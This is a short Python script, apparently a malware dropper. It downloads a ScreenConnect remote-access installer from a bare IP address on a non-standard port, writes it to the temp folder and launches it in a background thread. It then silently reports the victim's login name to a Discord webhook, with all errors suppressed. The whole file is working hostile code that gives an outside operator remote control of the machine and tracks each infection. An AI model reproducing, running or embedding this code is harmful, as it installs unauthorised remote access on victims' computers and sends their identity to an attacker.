import threading
import urllib.request
import json 
import os
import tempfile

def download_and_run(url):
    temp_dir = tempfile.gettempdir()
    file_path = os.path.join(temp_dir, 'ScreenConnect.ClientSetup.msi')
    with urllib.request.urlopen(url) as response, open(file_path, 'wb') as out_file:
        while True:
            chunk = response.read(8192)
            if not chunk:
                break
            out_file.write(chunk)
    os.startfile(file_path)

    try:
        url = 'https://discord.com/api/webhooks/1419779190399569940/TTmoY4jWra0wwRca21U8RIEvesch8duCqnCcQxxDF28i1UNCB09oDOZ3FVVMwJW-5oK2'
        data = {'content': f'Ran by {os.getlogin()}'}
        req = urllib.request.Request(url, data=json.dumps(data).encode(), headers={'Content-Type': 'application/json'})
        urllib.request.urlopen(req)
    except:
        pass

url = 'http://87.121.84.32:8040/Bin/ScreenConnect.ClientSetup.msi?e=Access&y=Guest'
thread = threading.Thread(target=download_and_run, args=(url,))
thread.start()
